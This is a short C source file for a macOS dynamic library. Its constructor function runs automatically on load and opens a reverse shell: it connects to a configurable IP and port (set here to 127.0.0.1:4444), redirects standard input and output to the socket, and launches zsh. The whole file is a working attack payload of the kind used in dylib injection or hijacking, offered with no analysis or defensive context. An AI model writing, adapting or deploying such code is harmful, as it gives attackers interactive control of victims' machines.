#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

__attribute__((constructor))
void reverse_shell() {
    int sockfd;
    struct sockaddr_in serv_addr;

    // CONFIGURATION
    char *ip = "127.0.0.1";
    int port = 4444;

    printf("[*] Dylib Loaded. Connecting to %s:%d...\n", ip, port);

    // Create TCP socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    // Configure server address
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &serv_addr.sin_addr);

    // Connect and redirect I/O
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == 0) {
        dup2(sockfd, 0); // Stdin
        dup2(sockfd, 1); // Stdout  
        dup2(sockfd, 2); // Stderr
        execl("/bin/zsh", "zsh", NULL);
    } else {
        printf("[-] Connection failed\n");
    }
}
